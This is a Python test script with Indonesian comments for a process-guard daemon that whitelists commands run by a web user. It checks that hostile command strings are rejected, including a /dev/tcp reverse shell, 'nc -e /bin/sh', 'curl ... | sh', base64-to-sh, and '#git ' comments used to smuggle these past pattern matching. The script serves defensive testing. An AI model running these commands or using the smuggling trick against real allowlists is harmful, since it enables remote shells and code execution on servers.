#!/usr/bin/env python3
# Uji process guard (sentinel-proc.py) setelah pengerasan 21 Okt 2026.
# PERINGATAN: bagian B menjalankan proses sebagai www; jangan di host produksi (lihat ZYS_PROC_LIVE).
# Bagian A: pencocokan whitelist murni (tanpa proses). Bagian B: scan_once dalam mode AUDIT (tidak ada
# proses yang dibunuh) terhadap proses uji yang dijalankan sebagai user web; DB, log, dan whitelist
# dialihkan ke direktori sementara.
# Pemakaian (root): python3 -B proc_guard_test.py <path sentinel-proc.py>
import os, sys, json, time, shutil, tempfile, subprocess, importlib.util, pwd

SRC = os.path.abspath(sys.argv[1])
T = tempfile.mkdtemp(prefix='zysproc.', dir='/tmp')
os.chmod(T, 0o755)
os.environ.update(SENTINEL_DB=T + '/g.db', SENTINEL_PROC_LOG=T + '/proc.log',
                  SENTINEL_PROC_WHITELIST=T + '/wl.json', SENTINEL_CONF=T + '/guardd.conf')
WL = [{'id': 'a', 'type': 'cmdline_match', 'pattern': 'git ', 'enabled': True},
      {'id': 'b', 'type': 'cmdline_match', 'pattern': 'artisan', 'enabled': True},
      {'id': 'c', 'type': 'cmdline_match', 'pattern': 'composer', 'enabled': True},
      {'id': 'd', 'type': 'cmdline_match', 'pattern': 'sleep', 'enabled': True}]
json.dump(WL, open(T + '/wl.json', 'w'))
open(T + '/guardd.conf', 'w').write('')
spec = importlib.util.spec_from_file_location('proc', SRC)
pg = importlib.util.module_from_spec(spec); spec.loader.exec_module(pg)

gagal = 0
def cek(n, k, i=''):
    global gagal
    print('  %s %s%s' % ('LULUS' if k else 'GAGAL', n, '' if k else '  -> ' + str(i)[:300]))
    if not k: gagal += 1

W = lambda argv, keras=False: pg.check_process_whitelist(0, 0, 1002, '/usr/bin/' + os.path.basename(argv[0]), ' '.join(argv), '/', os.path.basename(argv[0]), argv=argv, keras=keras)[0]
print('## A. pencocokan whitelist')
cek('cron deploy "bash -c cd ... && git stash && git pull" diizinkan', W(['bash', '-c', 'cd /www/wwwroot/x && git stash && git pull']))
PROD_CRON = 'cd /www/wwwroot/phs.sentris.web.id && git stash && git pull && git fetch --all | tee /tmp/git_pull.log && if ! grep -q "Already up to date." /tmp/git_pull.log; then php84 artisan config:cache && php84 artisan route:cache; fi'
cek('cron deploy PRODUKSI (tee, if/then/fi, php84 artisan) tetap diizinkan', W(['bash', '-c', PROD_CRON]))
cek('"echo x | base64 -d | sh; git pull" DITOLAK', not W(['bash', '-c', 'echo eA== | base64 -d | sh; git pull']))
cek('reverse shell dengan komentar "#git " DITOLAK', not W(['bash', '-c', 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1 #git ']))
cek('"nc -e /bin/sh ... #git" di dalam sh -c DITOLAK', not W(['sh', '-c', 'nc -e /bin/sh 1.2.3.4 9 #git ']))
cek('segmen campuran "git pull; curl x|sh" DITOLAK', not W(['bash', '-c', 'git pull; curl http://x/a.sh | sh']))
cek('substitusi perintah $(...) DITOLAK', not W(['bash', '-c', 'git pull $(curl x)']))
cek('"php artisan queue:work" diizinkan', W(['php', '/www/wwwroot/x/artisan', 'queue:work']))
cek('"php -d memory_limit=-1 composer install" diizinkan', W(['php', '-d', 'memory_limit=-1', '/usr/bin/composer', 'install']))
cek('"nc artisan -e /bin/sh" (pola sebagai argumen alat lain) DITOLAK', not W(['nc', 'artisan', '-e', '/bin/sh']))
cek('"/usr/bin/git pull" diizinkan', W(['/usr/bin/git', 'pull']))
cek('pelanggaran keras tidak dimaafkan pola perintah', not W(['git', 'pull'], keras=True))

print('\n## A2. pemantauan exec seketika (proc connector), uid uji 65534 = nobody, mode audit')
import threading, sqlite3
pg.running = True
tr = threading.Thread(target=pg._pendengar_exec, args=(65534, lambda: 'audit'), daemon=True)
tr.start()
time.sleep(0.5)
cek('proc connector aktif', pg.EXEC_EVENTS['aktif'], pg.EXEC_EVENTS)
pids = []
for _ in range(30):
    pr = subprocess.Popen(['sh', '-c', 'true'], user=65534, group=65534, cwd='/')
    pids.append(pr.pid); pr.wait()
time.sleep(1.0)
con = sqlite3.connect(T + '/g.db')
tertangkap = set(r[0] for r in con.execute("SELECT pid FROM proc_alerts WHERE rule LIKE 'ILLEGAL_SHELL%'"))
con.close()
n = len(tertangkap & set(pids))
print('    shell 1 ms tertangkap: %d dari 30 (peristiwa exec diterima: %d)' % (n, pg.EXEC_EVENTS['terima']))
print('    (informasi) proses < 1 ms sering sudah keluar sebelum /proc terbaca; batas pendekatan userspace')
pids2 = []
for _ in range(20):
    pr = subprocess.Popen(['sh', '-c', 'sleep 0.02'], user=65534, group=65534, cwd='/')
    pids2.append(pr.pid); pr.wait()
time.sleep(1.0)
con = sqlite3.connect(T + '/g.db')
t2 = set(r[0] for r in con.execute("SELECT pid FROM proc_alerts WHERE rule LIKE 'ILLEGAL_SHELL%'"))
con.close()
n2 = len(t2 & set(pids2))
print('    shell 20 ms tertangkap: %d dari 20' % n2)
cek('shell yang hidup ~20 ms tertangkap (20 dari 20)', n2 == 20, n2)
pr = subprocess.run(['sh', '-c', 'true'], cwd='/')
time.sleep(0.3)
con = sqlite3.connect(T + '/g.db')
root_ditandai = con.execute('SELECT COUNT(*) FROM proc_alerts WHERE uid = 0').fetchone()[0]
con.close()
cek('proses root tidak dinilai', root_ditandai == 0, root_ditandai)
pg.running = False

if os.environ.get('ZYS_PROC_LIVE') != '1':
    print('\n## B dilewati: set ZYS_PROC_LIVE=1 HANYA di mesin uji. Di host yang menjalankan')
    print('##   sentinel-proc produksi (mode enforce), proses uji sebagai www ikut dibunuh dan')
    print('##   memicu notifikasi webhook sungguhan.')
    shutil.rmtree(T, ignore_errors=True)
    print('\nRINGKAS: %d gagal' % gagal)
    sys.exit(1 if gagal else 0)
print('\n## B. scan_once mode audit (tanpa pembunuhan)')
www = pwd.getpwuid(1002).pw_name if any(p.pw_uid == 1002 for p in pwd.getpwall()) else None
if not www:
    cek('user uid 1002 tersedia', False, 'tidak ada'); sys.exit(1)
shutil.copy('/usr/bin/sleep', '/dev/shm/php-fpm')
os.chmod('/dev/shm/php-fpm', 0o755)
procs = {}
def jalan(nama, argv):
    procs[nama] = subprocess.Popen(argv, user=1002, group=1002, cwd='/tmp', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    jalan('shm', ['/dev/shm/php-fpm', '60'])
    jalan('revshell', ['bash', '-c', 'tail -f /dev/null; true #git '])
    jalan('deploy', ['bash', '-c', 'cd /tmp && sleep 62 && true'])
    jalan('perl_bukan_web', ['perl', '-e', 'sleep 63'])
    time.sleep(1)
    hasil = {f['pid']: f for f in pg.scan_once(target_uid=1002, mode='audit')}
    def aksi(n):
        f = hasil.get(procs[n].pid)
        return (f['rule'], f['action']) if f else None
    a = aksi('shm')
    cek('biner bernama php-fpm di /dev/shm terdeteksi TEMP_DIR_EXEC (dulu lolos nama aman)', a and a[0].startswith('TEMP_DIR_EXEC') and a[1] == 'AUDIT', a)
    a = aksi('revshell')
    cek('bash -c "... #git " tidak di-whitelist', a and a[0].startswith('ILLEGAL_SHELL') and a[1] == 'AUDIT', a)
    a = aksi('deploy')
    cek('bash -c "cd /tmp && sleep 62" di-whitelist (semua segmen diizinkan)', a and a[1] == 'WHITELISTED', a)
    cek('perl -e yang BUKAN turunan proses web tidak ditandai', aksi('perl_bukan_web') is None, aksi('perl_bukan_web'))
    cek('mode audit: semua proses uji masih hidup', all(p.poll() is None for p in procs.values()))
finally:
    for p in procs.values():
        p.kill()
    os.remove('/dev/shm/php-fpm')
    shutil.rmtree(T, ignore_errors=True)
print('\nRINGKAS: %d gagal' % gagal)
sys.exit(1 if gagal else 0)
